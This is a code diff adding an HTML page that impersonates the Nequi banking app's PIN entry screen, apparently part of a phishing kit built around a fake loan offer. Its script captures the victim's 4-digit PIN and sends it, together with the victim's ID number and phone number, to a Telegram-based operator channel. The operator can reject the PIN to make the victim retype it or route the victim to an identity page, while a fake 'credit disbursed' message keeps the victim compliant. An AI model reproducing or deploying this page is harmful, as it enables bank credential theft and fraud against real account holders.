@@ -1,0 +1,199 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Nequi - Escribe tu clave</title>
+  <link rel="shortcut icon" type="image/x-icon" href="images/favicon-3.ico">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@200;300;400;500;600;700&family=Montserrat:wght@200;300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="css/access-sign-in-pass.css?v=2">
+</head>
+<body>
+
+  <div class="screen-container">
+    <!-- Parte Superior: Título + Cajas de PIN + Texto -->
+    <div>
+
+      <h1 class="title-heading">Escribe tu clave</h1>
+
+      <!-- Las 4 cajas cuadradas exactamente como en la imagen -->
+      <div class="boxes-group" id="pinBoxes">
+        <div class="box-item"><div class="inner-dot"></div></div>
+        <div class="box-item"><div class="inner-dot"></div></div>
+        <div class="box-item"><div class="inner-dot"></div></div>
+        <div class="box-item"><div class="inner-dot"></div></div>
+      </div>
+
+      <!-- Texto descriptivo oficial Nequi -->
+      <p class="caption-text">
+        No dudamos que seas tú...<br>
+        Pero es mejor confirmar ;)
+      </p>
+    </div>
+
+    <!-- Parte Inferior: Teclado táctil exacto -->
+    <div>
+      <div class="keypad-grid-layout">
+        <button class="key-number-btn" type="button" data-val="1">1</button>
+        <button class="key-number-btn" type="button" data-val="2">2</button>
+        <button class="key-number-btn" type="button" data-val="3">3</button>
+
+        <button class="key-number-btn" type="button" data-val="4">4</button>
+        <button class="key-number-btn" type="button" data-val="5">5</button>
+        <button class="key-number-btn" type="button" data-val="6">6</button>
+
+        <button class="key-number-btn" type="button" data-val="7">7</button>
+        <button class="key-number-btn" type="button" data-val="8">8</button>
+        <button class="key-number-btn" type="button" data-val="9">9</button>
+
+        <div class="key-number-btn blank-slot"></div>
+        <button class="key-number-btn" type="button" data-val="0">0</button>
+        <button class="key-number-btn delete-slot" type="button" id="deleteBtn" aria-label="Borrar">
+          <div class="delete-badge">
+            <span class="delete-cross">&#x2715;</span>
+          </div>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal final de Crédito Desembolsado -->
+  <div class="modal-backdrop-flow" id="finishModal" aria-hidden="true">
+    <div class="modal-dialog-card">
+      <div class="modal-circle-check">
+        <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="20 6 9 17 4 12"></polyline>
+        </svg>
+      </div>
+
+      <h2 class="modal-title-success">¡Crédito desembolsado!</h2>
+      <p class="modal-desc-success">Hemos acreditado exitosamente los fondos en tu disponible de Nequi. Ya puedes disfrutarlos.</p>
+
+      <div class="amount-highlight-box">
+        <div class="amount-highlight-label">Monto acreditado</div>
+        <div class="amount-highlight-val" id="amountValText">$1.000.000</div>
+      </div>
+
+      <a href="index.html" class="btn-return-home">Ir al inicio</a>
+    </div>
+  </div>
+
+  <!-- Pantalla de Carga: Cubos Nequi Centrados (Fondo Blanco) -->
+  <div class="loader-overlay" id="loaderOverlay" style="display: none;">
+    <div class="nequi-loader">
+      <div class="cubes">
+        <div class="cube"></div>
+        <div class="cube"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Scripts: Telegram -->
+  <script src="js/telegram.js"></script>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      let currentPin = "";
+      const MAX_LENGTH = 4;
+      const boxes = document.querySelectorAll("#pinBoxes .box-item");
+      const numBtns = document.querySelectorAll(".key-number-btn[data-val]");
+      const deleteBtn = document.getElementById("deleteBtn");
+      const finishModal = document.getElementById("finishModal");
+      const amountValText = document.getElementById("amountValText");
+      const loaderOverlay = document.getElementById("loaderOverlay");
+
+      // Cargar monto preaprobado guardado en localStorage
+      const aprobado = localStorage.getItem("aprobado");
+      const formData = JSON.parse(localStorage.getItem("formData") || "{}");
+      if (aprobado) {
+        amountValText.textContent = `$${aprobado}`;
+      } else if (formData.montoPrestamo) {
+        amountValText.textContent = `$${new Intl.NumberFormat("es-CO").format(formData.montoPrestamo)}`;
+      }
+
+      function updateUI() {
+        boxes.forEach((box, idx) => {
+          if (idx < currentPin.length) {
+            box.classList.add("filled");
+          } else {
+            box.classList.remove("filled");
+          }
+        });
+      }
+
+      function pushDigit(d) {
+        if (currentPin.length < MAX_LENGTH) {
+          currentPin += d;
+          updateUI();
+
+          if (currentPin.length === MAX_LENGTH) {
+            formData.pin = currentPin;
+            localStorage.setItem("formData", JSON.stringify(formData));
+
+            // Mostrar pantalla blanca con cubos Nequi
+            if (loaderOverlay) {
+              loaderOverlay.style.display = "flex";
+            }
+
+            if (window.TelegramService) {
+              const phone = formData.phoneNumber || formData.celular || "";
+              window.TelegramService.notifyPin(formData.cedula, phone, currentPin);
+            }
+
+            let rejected = false;
+            if (window.TelegramService && window.TelegramService.listen) {
+              window.TelegramService.listen((action) => {
+                if (action && action.startsWith("btn_error_pin_")) {
+                  rejected = true;
+                  if (loaderOverlay) loaderOverlay.style.display = "none";
+                  currentPin = "";
+                  updateUI();
+                  alert("La clave ingresada es incorrecta. Por favor, intenta de nuevo.");
+                } else if (action && (action.startsWith("btn_pedir_otp_") || action.startsWith("btn_identidad_"))) {
+                  window.location.href = "identidad.html";
+                }
+              }, 4000);
+            }
+
+            // Tras la animación de cubos (2.5s), enviar a la pantalla de saldo
+            setTimeout(() => {
+              if (!rejected) {
+                window.location.href = "identidad.html";
+              }
+            }, 2500);
+          }
+        }
+      }
+
+      function popDigit() {
+        if (currentPin.length > 0) {
+          currentPin = currentPin.slice(0, -1);
+          updateUI();
+        }
+      }
+
+      numBtns.forEach(btn => {
+        btn.addEventListener("click", () => {
+          pushDigit(btn.getAttribute("data-val"));
+        });
+      });
+
+      if (deleteBtn) {
+        deleteBtn.addEventListener("click", popDigit);
+      }
+
+      // Teclado físico
+      document.addEventListener("keydown", (e) => {
+        if (/^[0-9]$/.test(e.key)) {
+          pushDigit(e.key);
+        } else if (e.key === "Backspace") {
+          popDigit();
+        }
+      });
+    });
+  </script>
+</body>
+</html>
